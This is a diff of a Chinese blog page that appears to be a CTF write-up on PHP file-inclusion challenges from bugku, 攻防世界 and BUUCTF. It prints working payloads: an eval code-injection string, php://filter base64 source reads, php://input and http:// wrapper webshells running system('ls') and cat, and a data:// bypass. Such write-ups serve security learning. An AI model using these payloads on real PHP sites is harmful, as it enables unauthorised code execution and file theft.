@@ -27,23 +27,23 @@
 <meta property="og:site_name" content="Daq1ang">
 <meta property="og:description" content="文件包含漏洞刚起步，遇到两个 文件包含 的题目先附上CSDN看到的关于文件包含的讲解https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_37133717&#x2F;article&#x2F;details&#x2F;94631028     bugku-6.文件包含-本地包含CSDN大佬讲解：本地文件包含漏洞详解第二行可知，flag在flag.php里，倒数第二行show_source(FILE)很明显的提示$_REQUEST[">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/bugku6.1.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/bugku6.2.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/bugku6.3.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/bugku12.0.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/bugku12.1.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/bugku12.2.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/gf3.0.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/gf3.1.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/gf3.2.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/gf3.3.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/gf3.4.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.1.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.2.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.3.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku12.0.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku12.1.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku12.2.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.0.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.1.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.2.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.3.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.4.png">
 <meta property="article:published_time" content="2021-01-16T02:15:37.000Z">
-<meta property="article:modified_time" content="2021-01-18T10:09:19.688Z">
+<meta property="article:modified_time" content="2021-03-26T14:36:28.732Z">
 <meta property="article:author" content="六公子买单">
 <meta property="article:tag" content="bugku刷到">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/images/bugku6.1.png">
+<meta name="twitter:image" content="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.1.png">
 
 <link rel="canonical" href="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
 
@@ -193,7 +193,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-18 18:09:19" itemprop="dateModified" datetime="2021-01-18T18:09:19+08:00">2021-01-18</time>
+                <time title="Modified: 2021-03-26 22:36:28" itemprop="dateModified" datetime="2021-03-26T22:36:28+08:00">2021-03-26</time>
               </span>
 
           
@@ -210,21 +210,21 @@
         <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>刚起步，遇到两个 文件包含 的题目<br>先附上CSDN看到的关于文件包含的讲解<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/94631028">https://blog.csdn.net/qq_37133717/article/details/94631028</a>    </p>
 <h2 id="bugku-6-文件包含-本地包含"><a href="#bugku-6-文件包含-本地包含" class="headerlink" title="bugku-6.文件包含-本地包含"></a>bugku-6.文件包含-本地包含</h2><p>CSDN大佬讲解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39431542/article/details/88628225">本地文件包含漏洞详解</a><br>第二行可知，flag在flag.php里，倒数第二行show_source(<strong>FILE</strong>)很明显的提示<br>$_REQUEST[]支持get、post两种方式发送过来的请求，很明显接收了hello参数的值，<br>var_dump()函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与值；数组将递归展开值，通过缩进显示其结构<br>eval()函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>show_source() 函数对文件进行语法显示,是 highlight_file() 的别名</p>
 <blockquote>
-<p>本题代码如下<br><img src="images/bugku6.1.png" alt="6.1">   </p>
+<p>本题代码如下<br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.1.png" alt="6.1">   </p>
 <ul>
-<li>可直接将flag.php文件读入变量hello中<br>url输入?hello=file(‘flag.php’)<br><img src="images/bugku6.2.png" alt="6.2">     </li>
-<li>eval存在命令执行漏洞，使用hello构造payload<br><code>index.php?hello=1);show_source(%27flag.php%27);var_dump(3</code><br><img src="images/bugku6.3.png" alt="6.3">    </li>
+<li>可直接将flag.php文件读入变量hello中<br>url输入?hello=file(‘flag.php’)<br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.2.png" alt="6.2">     </li>
+<li>eval存在命令执行漏洞，使用hello构造payload<br><code>index.php?hello=1);show_source(%27flag.php%27);var_dump(3</code><br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.3.png" alt="6.3">    </li>
 </ul>
 </blockquote>
 <hr>
 <h2 id="bugku-12-文件包含漏洞"><a href="#bugku-12-文件包含漏洞" class="headerlink" title="bugku-12.文件包含漏洞"></a>bugku-12.文件包含漏洞</h2><blockquote>
-<p><img src="images/bugku12.0.png" alt="12.0"><br>点<br><img src="images/bugku12.1.png" alt="12.1"><br>观察url : “<a target="_blank" rel="noopener" href="http://114.67.246.176:16465/index.php?file=show.php&quot;%EF%BC%8C%E7%9C%8B%E5%88%B0file%EF%BC%8C%E6%98%8E%E7%99%BD%E8%BF%99%E5%8F%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E8%81%94%E6%83%B3%E5%88%B0">http://114.67.246.176:16465/index.php?file=show.php&quot;，看到file，明白这又是文件包含的题目，联想到</a><u>读取index文件，但是直接读取index无法查看，所以就应该考虑用base64方法读取，构造url</u>.<br>构造url=“<a target="_blank" rel="noopener" href="http://your/">http://your</a> test ip/index.php?file=php://filter/read=convert.base64-encode/resource=index.php” , 网页返回base64.解码得flag<br><img src="images/bugku12.2.png" alt="12.2"> </p>
+<p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku12.0.png" alt="12.0"><br>点<br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku12.1.png" alt="12.1"><br>观察url : “<a target="_blank" rel="noopener" href="http://114.67.246.176:16465/index.php?file=show.php&quot;%EF%BC%8C%E7%9C%8B%E5%88%B0file%EF%BC%8C%E6%98%8E%E7%99%BD%E8%BF%99%E5%8F%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E8%81%94%E6%83%B3%E5%88%B0">http://114.67.246.176:16465/index.php?file=show.php&quot;，看到file，明白这又是文件包含的题目，联想到</a><u>读取index文件，但是直接读取index无法查看，所以就应该考虑用base64方法读取，构造url</u>.<br>构造url=“<a target="_blank" rel="noopener" href="http://your/">http://your</a> test ip/index.php?file=php://filter/read=convert.base64-encode/resource=index.php” , 网页返回base64.解码得flag<br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku12.2.png" alt="12.2"> </p>
 <ul>
 <li>php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。  </li>
 </ul>
 </blockquote>
 <hr>
-<h2 id="攻防世界-Web-php-include"><a href="#攻防世界-Web-php-include" class="headerlink" title="攻防世界-Web_php_include"></a>攻防世界-Web_php_include</h2><p><img src="images/gf3.0.png" alt="3.0"><br>从代码中得知page中带有php://的都会被替换成空<br>    str_replace()以其他字符替换字符串中的一些字符(区分大小写)<br>    strstr() 查找字符串首次出现的位置。返回字符串剩余部分    </p>
+<h2 id="攻防世界-Web-php-include"><a href="#攻防世界-Web-php-include" class="headerlink" title="攻防世界-Web_php_include"></a>攻防世界-Web_php_include</h2><p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.0.png" alt="3.0"><br>从代码中得知page中带有php://的都会被替换成空<br>    str_replace()以其他字符替换字符串中的一些字符(区分大小写)<br>    strstr() 查找字符串首次出现的位置。返回字符串剩余部分    </p>
 <blockquote>
 <p>方法一<br>1.可以利用PHP的大小写转换，利用PHP://input         </p>
 </blockquote>
@@ -232,7 +232,7 @@
 <li>php://filter<br>#执行文件<br>page=Php://filter/resource=index.php<br>#读取文件需要将文件名base64编码   page=Php://filter/read=convert.base64-encode/resource=index.php</li>
 <li>php://input<br>这个协议的利用方法是 将要执行的php代码写在post中提交，不用键与值的形式，只写代码即可。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class="line">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;   </span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>用burpsuite在报文中加一句话木马<br><img src="images/gf3.1.png" alt="3.1"><br><img src="images/gf3.2.png" alt="3.2">    </p>
+<p>用burpsuite在报文中加一句话木马<br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.1.png" alt="3.1"><br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.2.png" alt="3.2">    </p>
 </blockquote>
 </li>
 </ul>
@@ -247,9 +247,14 @@
 <p>方法三 http://协议进行绕过<br>利用hello参数将执行内容显示，flag如图所示</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;?hello&#x3D;&lt;? system(&quot;ls&quot;);?&gt;      </span><br></pre></td></tr></table></figure>
-<p><img src="images/gf3.3.png" alt="3.3">   </p>
+<p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.3.png" alt="3.3">   </p>
 <pre><code>?page=http://127.0.0.1/index.php/?hello=&lt;? show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;    </code></pre>
-<p><img src="images/gf3.4.png" alt="3.4"></p>
+<p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.4.png" alt="3.4"></p>
+<hr>
+<h2 id="buu-BJDCTF2020-ZJCTF，不过如此"><a href="#buu-BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="buu-[BJDCTF2020]ZJCTF，不过如此"></a>buu-[BJDCTF2020]ZJCTF，不过如此</h2><p>get传入两个参数text和file,text参数利用file_get_contents()函数只读形式打开，打开后内容要与”I have a dream”字符串相匹配，才能执行下面的文件包含$file参数。<br>看到用的是file_get_contents()函数打开text参数，以及后面的文件包含函数，自然的想到php伪协议中的data://协议</p>
+<pre><code>index.php?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</code></pre>
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>func是一个函数名，而p是一个参数，所以可以猜测用func来执行p</p>
+<p>试着改参数，读取代码：func=file_get_contents&amp;p=index.php</p>
 
     </div>
 
@@ -333,7 +338,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bugku-6-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="nav-number">1.1.</span> <span class="nav-text">bugku-6.文件包含-本地包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bugku-12-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">bugku-12.文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-include"><span class="nav-number">1.3.</span> <span class="nav-text">攻防世界-Web_php_include</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bugku-6-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="nav-number">1.1.</span> <span class="nav-text">bugku-6.文件包含-本地包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bugku-12-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">bugku-12.文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-include"><span class="nav-number">1.3.</span> <span class="nav-text">攻防世界-Web_php_include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buu-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="nav-number">1.4.</span> <span class="nav-text">buu-[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="nav-number">1.5.</span> <span class="nav-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -347,7 +352,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
